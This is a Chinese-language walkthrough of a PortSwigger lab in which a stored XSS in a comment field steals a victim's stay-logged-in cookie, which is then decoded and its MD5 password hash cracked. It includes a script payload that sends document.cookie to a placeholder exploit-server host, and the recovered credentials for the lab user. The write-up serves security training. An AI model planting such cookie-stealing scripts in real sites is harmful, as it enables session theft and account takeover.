# LAB：离线密码破解(hash)

来源：portswigger

漏洞描述：在网站不允许我们注册，没有自己的账号时，我们可以通过一些常规技术，比如XSS来窃取其他用户的cookie，并且，有些cookie我们可以通过离线的方式进行破解，比如说有hashcat这样的工具来帮助我们破解hash,并不需要爆破。

题目描述：

该LAB将用户的密码哈希值存储在cookie中。实验的评论功能还存在XSS,要完成实验，请获取 carlos的cookie`stay-logged-in`值，并用它破解密码。随后以carlos管理员身份，删除他的账号。



解决方案：

首先我们根据自己的凭证登录，获取cookie值，再去用工具破解：

![image-20260313173802263](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260313173802263.png)

cookie结构：

```
stay-logged-in = base64(username:md5(password))
```

由于本题不是用爆破来通过的，所以我们需要利用XSS漏洞来得到carlos的cookie值，进行解码。

评论功能存在XSS漏洞，所以：

![image-20260313174026543](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260313174026543.png)

```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

再去访问：漏洞利用服务器：

![image-20260313163704709](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260313163704709.png)

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

 从而获得carlos的cookie，进行解码：

```
carlos:onceuponatime
```

根据用户名和密码进行登录，删除账号。